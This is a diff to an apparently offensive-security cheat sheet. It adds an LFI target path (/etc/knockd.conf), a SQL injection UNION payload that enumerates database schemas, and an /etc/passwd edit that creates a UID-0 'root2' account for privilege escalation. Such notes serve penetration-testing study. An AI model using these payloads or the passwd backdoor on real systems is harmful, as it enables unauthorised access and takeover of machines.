@@ -258,6 +258,8 @@ https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.t
 /etc/nginx/modules-enabled/default.conf
 /opt/apache2/conf/httpd.conf
 /opt/apache/conf/httpd.conf
+
+/etc/knockd.conf
 ```
 ### id_sa
 ```bash
@@ -323,6 +325,7 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
 ' ORDER BY 1-- //
 ' or 1=1 order by 6 #
 ' UNION SELECT database(), user(), @@version, null, null -- //
+' union select 1,group_concat(schema_name),3,4,5,6 FROM information_schema.schemata #
 ' UNION SELECT null, username, password, description, null FROM users -- //
 ```
 ### MSSQL
@@ -992,8 +995,9 @@ wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linu
 ###  /etc/passwd
 ```bash
 joe@debian-privesc:~$ openssl passwd w00t
+joe@debian-privesc:~$ openssl passwd -1 w00t
 Fdzt.eqJQ4s0g
-joe@debian-privesc:~$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
+joe@debian-privesc:~$ echo 'root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash' >> /etc/passwd
 ```
 
 ### Kernel Ecpliot
